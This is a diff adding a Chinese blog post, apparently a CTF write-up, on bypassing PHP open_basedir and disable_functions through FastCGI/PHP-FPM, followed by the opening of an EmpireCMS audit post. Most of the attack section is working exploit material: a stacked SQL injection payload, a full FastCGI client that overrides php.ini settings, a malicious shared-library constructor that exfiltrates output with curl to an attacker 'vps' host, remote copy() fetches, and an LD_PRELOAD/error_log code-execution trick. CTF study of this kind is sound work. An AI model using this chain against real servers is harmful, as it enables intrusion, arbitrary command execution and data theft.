@@ -90,6 +90,565 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
+                    从一道CTF学习Fastcgi绕过姿势 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-09-17   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
+<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
+<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
+<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
+<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
+<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
+<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
+<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
+<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
+<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
+<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 
+
+0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
+=&gt;
+UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
+<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
+<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
+<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
+<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
+<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
+<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
+<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
+<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
+<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
+<p>在PHP中：</p>
+<ul>
+<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
+</li>
+<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
+</li>
+</ul>
+<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
+class TimedOutException extends \Exception {
+}
+class ForbiddenException extends \Exception {
+}
+class Client {
+const VERSION_1 = 1;
+const BEGIN_REQUEST = 1;
+const ABORT_REQUEST = 2;
+const END_REQUEST = 3;
+const PARAMS = 4;
+const STDIN = 5;
+const STDOUT = 6;
+const STDERR = 7;
+const DATA = 8;
+const GET_VALUES = 9;
+const GET_VALUES_RESULT = 10;
+const UNKNOWN_TYPE = 11;
+const MAXTYPE = self::UNKNOWN_TYPE;
+const RESPONDER = 1;
+const AUTHORIZER = 2;
+const FILTER = 3;
+const REQUEST_COMPLETE = 0;
+const CANT_MPX_CONN = 1;
+const OVERLOADED = 2;
+const UNKNOWN_ROLE = 3;
+const MAX_CONNS = &#39;MAX_CONNS&#39;;
+const MAX_REQS = &#39;MAX_REQS&#39;;
+const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
+const HEADER_LEN = 8;
+const REQ_STATE_WRITTEN = 1;
+const REQ_STATE_OK = 2;
+const REQ_STATE_ERR = 3;
+const REQ_STATE_TIMED_OUT = 4;
+private $_sock = null;
+private $_host = null;
+private $_port = null;
+private $_keepAlive = false;
+private $_requests = array();
+private $_persistentSocket = false;
+private $_connectTimeout = 5000;
+private $_readWriteTimeout = 5000;
+public function __construct( $host, $port ) {
+    $this-&gt;_host = $host;
+    $this-&gt;_port = $port;
+}
+public function setKeepAlive( $b ) {
+          $this-&gt;_keepAlive = (boolean) $b;
+          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getKeepAlive() {
+    return $this-&gt;_keepAlive;
+}
+public function setPersistentSocket( $b ) {
+          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
+          $this-&gt;_persistentSocket = (boolean) $b;
+          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getPersistentSocket() {
+    return $this-&gt;_persistentSocket;
+}
+public function setConnectTimeout( $timeoutMs ) {
+          $this-&gt;_connectTimeout = $timeoutMs;
+}
+public function getConnectTimeout() {
+    return $this-&gt;_connectTimeout;
+}
+public function setReadWriteTimeout( $timeoutMs ) {
+          $this-&gt;_readWriteTimeout = $timeoutMs;
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+}
+public function getReadWriteTimeout() {
+    return $this-&gt;_readWriteTimeout;
+}
+private function set_ms_timeout( $timeoutMs ) {
+          if ( ! $this-&gt;_sock ) {
+        return false;
+    }
+    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
+}
+private function connect() {
+    if ( ! $this-&gt;_sock ) {
+              if ( $this-&gt;_persistentSocket ) {
+                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              } else {
+                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              }
+              if ( ! $this-&gt;_sock ) {
+                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
+              }
+              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
+            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
+        }
+    }
+}
+private function buildPacket( $type, $content, $requestId = 1 ) {
+          $clen = strlen( $content );
+    return chr( self::VERSION_1 )         /* version */
+           . chr( $type )                    /* type */
+                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
+           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
+                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
+           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
+                 . chr( 0 )                        /* paddingLength */
+                 . chr( 0 )                        /* reserved */
+                 . $content;                     /* content */
+}
+private function buildNvpair( $name, $value ) {
+    $nlen = strlen( $name );
+    $vlen = strlen( $value );
+    if ( $nlen &lt; 128 ) {
+              /* nameLengthB0 */
+              $nvpair = chr( $nlen );
+          } else {
+              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
+          }
+          if ( $vlen &lt; 128 ) {
+        /* valueLengthB0 */
+        $nvpair .= chr( $vlen );
+    } else {
+        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
+    }
+    /* nameData &amp; valueData */
+    return $nvpair . $name . $value;
+}
+private function readNvpair( $data, $length = null ) {
+    $array = array();
+          if ( $length === null ) {
+        $length = strlen( $data );
+    }
+    $p = 0;
+          while ( $p != $length ) {
+              $nlen = ord( $data{$p ++} );
+              if ( $nlen &gt;= 128 ) {
+                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $nlen |= ( ord( $data{$p ++} ) );
+              }
+              $vlen = ord( $data{$p ++} );
+              if ( $vlen &gt;= 128 ) {
+                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $vlen |= ( ord( $data{$p ++} ) );
+              }
+              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
+              $p                                   += ( $nlen + $vlen );
+    }
+    return $array;
+}
+private function decodePacketHeader( $data ) {
+          $ret                  = array();
+          $ret[&#39;version&#39;]       = ord( $data{0} );
+          $ret[&#39;type&#39;]          = ord( $data{1} );
+          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
+          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
+          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
+          $ret[&#39;reserved&#39;]      = ord( $data{7} );
+    return $ret;
+}
+private function readPacket() {
+    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
+        $resp            = $this-&gt;decodePacketHeader( $packet );
+              $resp[&#39;content&#39;] = &#39;&#39;;
+        if ( $resp[&#39;contentLength&#39;] ) {
+                  $len = $resp[&#39;contentLength&#39;];
+                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
+                      $len             -= strlen( $buf );
+                      $resp[&#39;content&#39;] .= $buf;
+                  }
+              }
+              if ( $resp[&#39;paddingLength&#39;] ) {
+            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
+        }
+        return $resp;
+    } else {
+        return false;
+    }
+}
+public function getValues( array $requestedInfo ) {
+          $this-&gt;connect();
+          $request = &#39;&#39;;
+          foreach ( $requestedInfo as $info ) {
+              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
+          }
+          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
+          $resp = $this-&gt;readPacket();
+          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
+              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
+    } else {
+        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
+    }
+}
+public function request( array $params, $stdin ) {
+    $id = $this-&gt;async_request( $params, $stdin );
+    return $this-&gt;wait_for_response( $id );
+}
+public function async_request( array $params, $stdin ) {
+    $this-&gt;connect();
+          // Pick random number between 1 and max 16 bit unsigned int 65535
+          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
+    // Using persistent sockets implies you want them keept alive by server!
+    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
+          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
+              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
+        , $id
+          );
+          $paramsRequest = &#39;&#39;;
+    foreach ( $params as $key =&gt; $value ) {
+              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
+          }
+          if ( $paramsRequest ) {
+        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
+          if ( $stdin ) {
+        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
+          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
+        $info = stream_get_meta_data( $this-&gt;_sock );
+        if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Write timed out&#39; );
+              }
+              // Broken pipe, tear down so future requests might succeed
+              fclose( $this-&gt;_sock );
+        throw new \Exception( &#39;Failed to write request to socket&#39; );
+    }
+    $this-&gt;_requests[ $id ] = array(
+        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
+        &#39;response&#39; =&gt; null
+    );
+    return $id;
+}
+public function wait_for_response( $requestId, $timeoutMs = 0 ) {
+    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
+        throw new \Exception( &#39;Invalid request id given&#39; );
+    }
+    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
+         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
+    ) {
+        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+    if ( $timeoutMs &gt; 0 ) {
+              // Reset timeout on socket for now
+              $this-&gt;set_ms_timeout( $timeoutMs );
+          } else {
+              $timeoutMs = $this-&gt;_readWriteTimeout;
+    }
+    $startTime = microtime( true );
+          do {
+              $resp = $this-&gt;readPacket();
+              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
+                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
+                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
+                  }
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
+              }
+              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
+                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
+                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
+                      break;
+                  }
+              }
+              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
+                  // Reset
+                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+                  throw new \Exception( &#39;Timed out&#39; );
+              }
+          } while ( $resp );
+    if ( ! is_array( $resp ) ) {
+              $info = stream_get_meta_data( $this-&gt;_sock );
+              // We must reset timeout but it must be AFTER we get info
+              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+              if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Read timed out&#39; );
+              }
+              if ( $info[&#39;unread_bytes&#39;] == 0
+                   &amp;&amp; $info[&#39;blocked&#39;]
+                   &amp;&amp; $info[&#39;eof&#39;] ) {
+                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
+              }
+              throw new \Exception( &#39;Read failed&#39; );
+          }
+          // Reset timeout
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
+        case self::CANT_MPX_CONN:
+            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
+            break;
+        case self::OVERLOADED:
+            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
+            break;
+        case self::UNKNOWN_ROLE:
+            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
+            break;
+        case self::REQUEST_COMPLETE:
+            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
+    }
+}
+}
+$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
+  $php_value = &quot;open_basedir = /&quot;;
+$filepath  = &#39;/tmp/readflag.php&#39;;
+  $content   = &#39;hpdoger&#39;;
+echo $client-&gt;request(
+      array(
+          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
+          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
+          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
+    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
+    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
+    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
+    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
+    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
+    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
+          &#39;PHP_VALUE&#39;         =&gt; $php_value,
+),
+$content
+);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
+<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
+<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）
+
+*lo2.txt*=&gt;
+&lt;?php
+$file_list = array();
+// normal files
+$it = new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator(&quot;glob:///.*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);
+foreach($file_list as $f){
+        echo &quot;{$f}&lt;br/&gt;&quot;;
+}
+?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
+<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
+<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
+<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
+<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
+<pre><code>&lt;?php
+var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
+<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
+<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
+<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
+<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
+<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
+<pre><code>#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+__attribute__ ((__constructor__)) void preload (void)
+{
+    system(&quot;curl vps:6666/`/readflag`&quot;);
+}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
+<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
+<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
+<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
+<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
+error_log(&#39;&#39;,1);
+?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 
+                    帝国(EmpireCMS)7.5的两个后台RCE审计 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-09-09   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p>
